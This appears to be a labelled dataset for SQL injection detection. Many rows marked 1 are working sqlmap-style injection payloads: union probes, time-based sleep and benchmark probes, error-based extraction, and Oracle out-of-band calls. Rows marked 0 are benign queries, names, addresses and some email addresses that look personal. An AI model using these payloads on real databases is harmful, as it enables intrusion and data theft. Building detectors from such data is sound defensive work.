Payload	Attacker
1'||  (  select 'qrle' from dual where 9239  =  9239 or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )     )  ||'	1
SELECT glad ( s )  FROM curious	0
SELECT * FROM all WHERE solution = 'press' LIMIT 3	0
  UPDATE pattern SET somehow =  'take', City =  'unhappy' WHERE avoid =  grass	0
   SELECT here, organized+ ', ' + claws+ ' ' + teacher+ ', ' + respect AS count  FROM leaf	0
"-9751""   )    )     )   or 5929  =  3884--"	1
rached	0
"1%""  )   and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and   (  ""%""  =  """	1
SELECT COUNT ( structure )  FROM date	0
6196	0
"1""   )    )     (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and    (    (   ""prhp""  =  ""prhp"	1
ibarrangelu	0
mahbeer	0
SELECT * FROM off ORDER BY wealth DESC	0
932690000000000	0
-8615   )    )     )   or 4039  =  9144	1
-1543%' union all select 9341,9341,9341,9341,9341,9341,9341,9341,9341--	1
-5528'  )   union all select 5153,5153,5153,5153,5153,5153,5153,5153,5153#	1
SELECT * FROM camp ORDER BY ants	0
SELECT * FROM port WHERE Price NOT BETWEEN 10 AND 20	0
-7971' union all select 4273#	1
"1""   )    )    as rign where 1604  =  1604 and 3661  =  3054--"	1
spinnell@cpanelweb.com.ao	0
SELECT * FROM parent FETCH FIRST 50 PERCENT ROWS ONLY	0
-8203   )    )    as eqlf where 6132  =  6132 union all select 6132,6132,6132,6132,6132,6132,6132,6132,6132--	1
SELECT * FROM nothing WHERE quick NOT LIKE '[share]%'	0
1   )    )     (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and    (    (   1402  =  1402	1
SELECT AVG ( lay ) FROM pass	0
1,  (  select   (  case when   (  8392  =  8404  )   then 1 else 8392*  (  select 8392 from information_schema.character_sets  )   end   )    )   	1
-2100' where 9260  =  9260 or 3038  =  3038	1
FROM  ( SELECT DISTINCT house FROM shelf ) 	0
  SELECT announced,noon FROM beginning WHERE brown = 'cave' UNION SELECT foot, quiet FROM rabbit	0
youji	0
1   )    )    as prnp where 4932  =  4932 or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )  --	1
38726	0
1   )    )     )   union all select null,null,null,null,null,null,null,null,null,null--	1
1' where 8803  =  8803 or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --	1
SELECT * FROM money 3	0
1'  )   and 6969  =    (  select 6969 from pg_sleep  (  5   )    ) 	1
benchmark  (  10000000,MD5  (  1   )    )   #	1
8554610000000000	0
15318	0
99020664y	0
calle petunias 34 1-e	0
SELECT TOP 50 PERCENT * FROM went SELECT * FROM that FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM ear	0
cecon5	0
"1""  )   as hfvz where 7186  =  7186 union all select null,null,null,null,null,null#"	1
81e9604o6o	0
select * from users where id  =  '1' + $+%\ or 1  =  1 -- 1'	1
winston@chinavende.bi	0
SELECT income FROM oxygen UNION SELECT therefore FROM courage ORDER BY stronger	0
INSERT INTO pressure ( giving, prize, powder, mail, work, common )  VALUES  ( 'chosen', 'roll'. characteristic', 'somebody', 'soon', 'before', 'rest' )  	0
15317	0
-3697'   )    )     )   union all select 5180,5180,5180,5180,5180,5180,5180--	1
SELECT * FROM sudden WHERE pig = 'pile'  OR hand = 'mix'	0
call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (   '%'  =  '	1
 SELECT * FROM Customers  WHERE Country IN  ( 'Germany', 'France', 'UK' ) ;	0
SELECT * FROM increase WHERE pipe = 'nothing' LIMIT 3	0
SELECT * FROM universe WHERE fifty = 'better'  AND City = 'belt'	0
 SELECT * FROM his ORDER BY press ASC, ear DESC	0
SELECT AVG ( over ) FROM court	0
select   (  case when   (  2501  =  4688  )   then 2501 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--	1
SELECT * FROM calm WHERE plate IN  ( SELECT three FROM sun ) 	0
SELECT COUNT ( share ) FROM apple	0
"-1808%""   )    )    or 4595  =  3545 and    (    (   ""%""  =  """	1
"1"" or elt  (  6272  =  6272,sleep  (  5   )    )    and ""zzca""  =  ""zzca"	1
1   )    )    or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --	1
1   )    )     )   or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (     (  4858  =  4858	1
1'  )   as bscn where 6907  =  6907	1
1'   )    )     )   and 3602  =  1990#	1
1'   )    )     (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )   and    (    (   'rbhe'  =  'rbhe	1
1'||  (  select 'ghby' from dual where 4854  =  4854	1
SELECT * FROM Customers WHERE City  =  @City AND PostalCode  =  @PostalCode GO;  EXEC SelectAllCustomers @City  =  'London', @PostalCode  =  'WA1 1DP';	0
-1891' in boolean mode  )   union all select 6680,6680,6680,6680,6680,6680,6680,6680#	1
1'||  (  select 'vwls' where 5252  =  5252 rlike sleep  (  5  )  #	1
1'  )   where 3330  =  3330 and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --	1
end and    (    (     (  'hglq' like 'hglq	1
1'   )    )    and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and    (    (   'sied'  =  'sied	1
85744372g	0
" select * from users where id  =  1 or 1#""@ union select version  (    )  ,version  (    )   -- 1"	1
1 where 7196  =  7196 or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   --	1
   SELECT Employees.column, COUNT ( Orders.stickID )  AS seeFROM    ( OrdersINNER JOIN leader ON Orders.winID  =  Employees.silenceID ) 	0
c/ costa i llobera 83	0
SELECT * FROM control	0
select * from generate_series  (  2673,2673,case when   (  2673  =  1468  )   then 1 else 0 end  )   limit 1--	1
"1""  )   or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  ""zbwn"" like ""zbwn"	1
"-6014"" or make_set  (  3003  =  2609,2609  )  "	1
DELETE FROM string	0
1 where 7442  =  7442	1
SELECT TOP 50 PERCENT * FROM our	0
  UPDATE effort SET noise =  'process', City =  'smaller' WHERE strong =  sets	0
c/ juan ramon jimenez, 135, 11d	0
1  )   and elt  (  7425  =  8842,8842  )   and   (  9194  =  9194	1
SELECT AVG ( forty ) FROM obtain	0
s16nio5o	0
1 where 6044  =  6044 or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  --	1
1 where 3027  =  3027 and 4595  =  4595#	1
SELECT * FROM  ( SELECT silly FROM thin ) 	0
select   (  case when   (  1868  =  5071  )   then 1 else 1868*  (  select 1868 from master..sysdatabases  )   end  )  --	1
1'  )   as qcse where 4147  =  4147 waitfor delay '0:0:5'--	1
braiam	0
SELECT option_value FROM wp_options WHERE option_name  =  '_options_footer_button_4_link' LIMIT 1	0
"SELECT * FROM labor WHERE noted BETWEEN ""fresh"" AND    ""count"""	0
1' where 8430  =  8430 or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --	1
calle diamante, 57	0
6425500000000000	0
  (  select * from generate_series  (  3906,3906,case when   (  3906  =  3906  )   then 1 else 0 end  )   limit 1  )  	1
alvino	0
1'  )   where 5286  =  5286	1
lauriaul	0
1'||  (  select 'mwmn' where 5112  =  5112 or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a   )    )   ||'	1
"1""   )    )    or sleep  (  5  )  #"	1
select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and    (    (     (  'clhg'  =  'clhg	1
   SELECT troops,thousand,someone,energy,took     (  (  handle JOIN hello ON union.fish =  little.natural )   INNER JOIN keepON Orders.sides =  police.morningID ) 	0
82380804w	0
1'   )    )     )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and    (    (     (  'yqhk'  =  'yqhk	1
aguilera troule	0
1 where 1842  =  1842 or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #	1
"-4639""   )    )     )   or 8550  =  9348"	1
"-2625""   )    )    as qfuo where 1980  =  1980 union all select 1980,1980,1980--"	1
"-5972"" or 8509  =  3448#"	1
 SELECT * FROM sets ORDER BY score, fierce	0
if  (  4907  =  9581  )   select 4907 else drop function apqw--	1
"waitfor delay '0:0:5' and   (  ""dmcu""  =  ""dmcu"	1
"-6593""  )   union all select 6216,6216,6216,6216,6216,6216,6216#"	1
SELECT MIN ( stream )  AS dance FROM three	0
1   )    )     )   and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and    (    (     (  5333  =  5333	1
47319	0
"1""  )   as ymto where 3453  =  3453"	1
1'   )    )     )   and elt  (  1210  =  1210,sleep  (  5   )    )    and    (    (     (  'aiuy'  =  'aiuy	1
  SELECT * FROM missing WHERE fairly NOT IN  ( 'father', 'industry', 'travel' )  	0
milly7	0
ricard	0
SELECT COUNT ( usID ) FROM blind	0
SELECT AVG ( Price ) FROM wheel	0
select case when 7951  =  1147 then 1 else null end--	1
1'   )    )    and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and    (    (   'jryo'  =  'jryo	1
1%'   )    )     )   or 5356  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --	1
SELECT * FROM suddenly WHERE    NOT public = 'class'	0
62120654t	0
SELECT prepare ( s FROM shade RIGHT JOIN	0
SELECT TOP 50 PERCENT * FROM obtain SELECT * FROM section FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM basket	0
  )   or   (  'x'  )    =    (  'x	1
t08a26	0
   SELECT COUNT ( run ) , conversation FROM open BY shoe	0
1'   )    )    or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and    (    (   'gydh'  =  'gydh	1
1 where 5828  =  5828 and   (  3020  =  3020  )  *6703--	1
SELECT wp_posts.ID FROM wp_posts WHERE 1 = 1 AND wp_posts.post_type  =  'acf-field' AND   (  (  wp_posts.post_status  =  'publish'  )  )   AND wp_posts.post_name  =  'field_5f6c82f1dbb24' ORDER BY wp_posts.menu_order ASC, wp_posts.post_title ASC LIMIT 0, 1	0
SELECT prevent ( s )  FROM melted SELECT quarter FROM may	0
1'  )   as bzem where 4240  =  4240	1
c/ peru, 85, 10?h	0
brihuega	0
-2781   )    )     )   or 2573  =  5848--	1
-2174'   )    )    or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (   'dyyg'  =  'dyyg	1
1  )   and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and   (  9932  =  9932	1
65236882g	0
carmelo	0
"-1000"" or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and ""isbq""  =  ""isbq"	1
SELECT * FROM many WHERE situation = 'pull' LIMIT 3	0
SELECT * FROM capital  WHERE heard = judge	0
pasaje cesar arbasia, 99, 3-a	0
SELECT AVG ( ready ) FROM pure SELECT SUM ( chapter ) 	0
SELECT * FROM sitting FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM wing	0
"-1097"" where 4421  =  4421 union all select 4421,4421,4421,4421,4421#"	1
1'  )   and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and   (  'rjjo'  =  'rjjo	1
  SELECT important AS add, particular AS [into]  FROM dull	0
FROM  ( SELECT DISTINCT twice FROM larger ) 	0
0i26or7os9	0
bullicioso	0
1'  )   waitfor delay '0:0:5'	1
1' or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --	1
16340	0
1'||  (  select 'qdkb' where 4331  =  4331	1
SELECT * FROM position FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM search	0
SELECT * FROM fireplace WHERE brick IN  ( SELECT green FROM type ) 	0
7118	0
SELECT * FROM verb WHERE pay = 'thee' FETCH FIRST 3 ROWS ONLY	0
gupton	0
1'  )   where 9516  =  9516	1
SELECT * FROM major WHERE sharp NOT BETWEEN 'bear' AND 'occasionally'	0
  SELECT famousID AS ID, principle AS room FROM children	0
SELECT * FROM glad WHERE doll = 'already'  OR huge = 'fight'	0
"-4056""   )    )     )   union all select 4363,4363,4363,4363,4363,4363,4363,4363#"	1
1  )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and   (  2160  =  2160	1
  SELECT ourID AS ID, knife AS plenty FROM close	0
"-5169""   )    )    union all select 6198,6198,6198,6198--"	1
chrysa2	0
-1866'   )    )    as cwtv where 3295  =  3295 order by 1--	1
1%'   )    )    union all select null,null,null,null,null,null,null,null,null--	1
81180031j	0
" end and   (  ""vwbx""  =  ""vwbx"	1
"-9023%""   )    )     )   union all select 4490,4490,4490#"	1
francina	0
  SELECT Orders.boyrID, Employees.knowledge, Employees.visit FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.signalID ORDER BY Orders.barkID	0
   SELECT COUNT ( notice ) , carried FROM lay BY modern	0
1  )   as fnpq where 5209  =  5209	1
   SELECT usual, exclaimed, occurFROM higher WHERE list  IS NOT NULL	0
"1"" where 2619  =  2619 and 2823  =  5100#"	1
madisett	0
"-4798""   )    )     )   union all select 7892,7892,7892,7892,7892,7892,7892,7892,7892,7892#"	1
19133	0
1' and elt  (  2266  =  7467,7467  )  	1
chapurrar	0
SELECT COUNT ( box ) FROM balance	0
SELECT very ( s FROM slightly RIGHT JOIN	0
26580	0
"-6073""   )    )     )   or 9502  =  2012#"	1
casaubn de rosa	0
"1"" and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and ""lgwe"" like ""lgwe"	1
FROM  ( SELECT DISTINCT lion FROM asleep ) 	0
dennis	0
1'+  (  select 'dhcv' where 9372  =  9372	1
SELECT * FROM cent WHERE    NOT bound = 'memory'	0
calle juan agui 97 9-e	0
 SELECT CustomerName, ContactName, Address FROM Customers WHERE Address  IS NULL;	0
"1""  )   as hblk where 7982  =  7982 and 9611  =  6142--"	1
1'  )   or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  	1
1'||  (  select 'jfxs' from dual where 5485  =  5485 and char  (  109  )  ||char  (  79  )  ||char  (  70  )  ||char  (  90  )    =  regexp_substring  (  repeat  (  right  (  char  (  5012  )  ,0  )  ,5000000000  )  ,null  )  --	1
6411	0
wyle@designworld.us	0
SELECT AVG ( usual ) FROM three	0
-9574%'   )    )    union all select 5645,5645,5645,5645,5645,5645,5645--	1
SELECT COUNT ( whom ) FROM inside	0
pensosa	0
marylin	0
SELECT COUNT ( son ) FROM remarkable	0
macinnes	0
SELECT COUNT ( essential ) FROM jack	0
SELECT TOP 50 PERCENT * FROM useful	0
SELECT * FROM chain WHERE butter LIKE '%way%'	0
1'   )    )     )   and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (     (  'abcf' like 'abcf	1
1'   )    )    or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and    (    (   'gyre'  =  'gyre	1
1.97346E+015	0
SELECT * FROM progress WHERE pilot = 'chain'  AND  ( mountain = 'involved' OR meal = 'went' ) 	0
96639593x	0
SELECT * FROM queen WHERE riding BETWEEN 'yet' AND 'excitement'	0
ridgeley_fechner@beesmer.ye	0
SELECT Count ( * )  AS ourselves	0
22010612a	0
" select * from users where id  =  1 or "".  )  "" or 1  =  1 -- 1"	1
 (  select   (  case when   (  3592  =  3592  )   then 3592 else 3592*  (  select 3592 from information_schema.character_sets  )   end   )    ) 	1
matthiew	0
1 and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )  -- ybmz	1
SELECT movement ( s FROM shadow RIGHT JOIN	0
4ino57l	0
"  SELECT TIME_TO_SEC ( ""00:00:05"" ) ;"	0
SELECT * FROM supply WHERE fellow = 'youth' FETCH FIRST 3 ROWS ONLY	0
INSERT INTO with ( leaf, trip, today, life, view, afraid )  VALUES  ( 'been', 'round'. suit', 'replied', 'year', 'help', 'save' )  	0
SELECT MIN ( just )  AS second FROM solar	0
SELECT * FROM told FETCH FIRST 50 PERCENT ROWS ONLY	0
robelo@moviels.me	0
-9264'  )   or 8571  =  8571--	1
SELECT * FROM coach WHERE wonder LIKE '%know%'	0
d308ada	0
-6514   )    )    as pbgg where 6841  =  6841 union all select 6841,6841,6841,6841--	1
1   (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )  -- fzhj	1
7770000000000000	0
select   (  case when   (  8331  =  5625  )   then 8331 else 8331*  (  select 8331 from mysql.db  )   end  )  #	1
  SELECT * FROM shirt WHERE contrast NOT IN  ( 'got', 'receive', 'riding' )  	0
SELECT TOP 50 PERCENT * FROM recognize	0
dehr	0
renan1@fichajes.nom.sd	0
1%'   )    )    union all select null,null,null,null#	1
1'  )   where 1470  =  1470 and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --	1
"SELECT DAYOFYEAR ( ""2017-01-01"" ) ;"	0
losar de la vera	0
SELECT * FROM flies  WHERE bit = four	0
1   )    )     )   order by 1#	1
SELECT potatoes ( s )  FROM search LEFT JOIN	0
SELECT * FROM ride WHERE exclaimed  BETWEEN 10 AND 20	0
benzo	0
darns cabrianes	0
 select * from users where id  =  '1' union select ||/1,version  (    )   -- 1'	1
-6815  )   where 2498  =  2498 union all select 2498,2498,2498,2498,2498--	1
"1%""   )    )    and 7533  =  7533 and    (    (   ""%""  =  """	1
  SELECT Orders.electricityrID, Employees.number, Employees.race FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.aboardID ORDER BY Orders.eatID	0
40984940k	0
1' where 5035  =  5035 and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --	1
   SELECT COUNT ( basis ) , mysterious FROM dirt BY cent	0
select sleep  (  5  )  -- waln	1
"  (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and    (    (   ""hxdd""  =  ""hxdd"	1
4574	0
keng@glutenfreespain.lb	0
SELECT not ( s )  FROM felt SELECT hollow ( s ) 	0
SELECT AVG ( Price ) FROM lucky	0
  SELECT PERIOD_DIFF ( 1703, 1612 ) ;	0
" select * from users where id  =  1 or 1#""? union select 'a',version  (    )   -- 1"	1
SELECT AVG ( mark ) FROM crew SELECT SUM ( mine ) 	0
SELECT * FROM job WHERE wash = 'floating' FETCH FIRST 3 ROWS ONLY	0
SELECT * FROM wp_posts WHERE  ( post_type  =  'page' AND post_status  =  'publish' )  AND post_parent  =  27990 ORDER BY wp_posts.post_title ASC LIMIT 0,1	0
SELECT COUNT ( couldID ) FROM rocket	0
magdiel	0
"1""  )   union all select null,null,null,null#"	1
1 where 7890  =  7890 or sleep  (  5  )  --	1
SELECT * FROM sold ORDER BY hot	0
savino	0
"-1333""   )    )    union all select 2376,2376,2376,2376,2376,2376,2376,2376,2376--"	1
ar2e5tad6	0
27002	0
78	0
1   )    )    or sleep  (  5  )   and    (    (   8285  =  8285	1
SELECT TOP 50 PERCENT * FROM trap SELECT * FROM toy FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM tube	0
hodos@926.fr	0
"1""  )   as jask where 7629  =  7629 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )  --"	1
and 1 in   (  select var from temp  )  --	1
mcglynn	0
SELECT * FROM simplest WHERE atmosphere = 'tiny'  OR whole = 'military'	0
"1%""  )   and   (  3020  =  3020  )  *6703 and   (  ""%""  =  """	1
SELECT * FROM since WHERE roar NOT BETWEEN 'biggest' AND 'control'	0
"1%""   )    )     )   and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and    (    (     (  ""%""  =  """	1
melucci	0
1' and make_set  (  9860  =  6956,6956  )   and 'toru'  =  'toru	1
   SELECT boy, sky+ ', ' + send+ ' ' + label+ ', ' + speed AS image  FROM birthday	0
"1%""  )   and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --"	1
SELECT get ( s )  FROM smoke UNION	0
lopiano	0
almansa ingls	0
SELECT Count ( * )  AS month	0
1   )    )    as skex where 7941  =  7941 and sleep  (  5  )  --	1
1'   )    )    as ovbz where 3203  =  3203   (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )  --	1
-7060'  )   or make_set  (  4233  =  1689,1689  )   and   (  'twpr' like 'twpr	1
1%'   )    )    union all select null#	1
-7346 or 8571  =  8571--	1
 UPDATE new SET silver = 'slabs'WHERE headed = 'shoe'	0
"-9272%""   )    )     )   or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and    (    (     (  ""%""  =  """	1
1'+  (  select 'jmdl' where 7827  =  7827	1
SELECT gravity ( s )  FROM please SELECT establish FROM letter	0
1'   )    )     )   and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and    (    (     (  'viad' like 'viad	1
1'||  (  select 'vpuh' where 8164  =  8164	1
"1%""  )   order by 1--"	1
SELECT TOP 3 * FROM danger WHERE rocky = 'better'	0
   SELECT Employees.fence, COUNT ( Orders.volumeID )  AS chamberFROM    ( OrdersINNER JOIN sister ON Orders.layersID  =  Employees.cloudID ) 	0
79564193v	0
  SELECT protection AS court, exact AS [growth]  FROM but	0
SELECT * FROM hay FETCH FIRST 3 ROWS ONLY	0
SELECT * FROM nation FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM basket	0
"SELECT * FROM gas WHERE dollar BETWEEN ""giant"" AND    ""graph"""	0
1'   )    )    as wkys where 2478  =  2478 and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --	1
2.11181E+015	0
-5891 union all select 7103,7103,7103,7103--	1
"1""  )   as zuzm where 1211  =  1211 and elt  (  5458  =  2966,2966  )  --"	1
SELECT MIN ( ground )  AS ship FROM sheep	0
  SELECT lot AS term, gulf AS [tax]  FROM upon	0
 AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  USERNAME  )   FROM   (  SELECT DISTINCT  (  USERNAME  )  , ROWNUM AS LIMIT FROM SYS.ALL_USERS  )   WHERE LIMIT  =  5   )    )    AND 'i'  =  'i	1
SELECT * FROM rich 3	0
SELECT * FROM dark FETCH FIRST 50 PERCENT ROWS ONLY	0
end and 'icny' like 'icny	1
 SELECT * FROM own ORDER BY highest, improve	0
SELECT * FROM energy WHERE bark = 'upon' FETCH FIRST 3 ROWS ONLY	0
vilamasa pacheca	0
SELECT * FROM off WHERE motion = 'no'	0
31439	0
end and   (  9416  =  9416	1
indocto	0
-3496'   )    )    or 9323  =  9323#	1
7012	0
rajarshi	0
SELECT TOP 50 PERCENT * FROM read SELECT * FROM kept FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM beyond	0
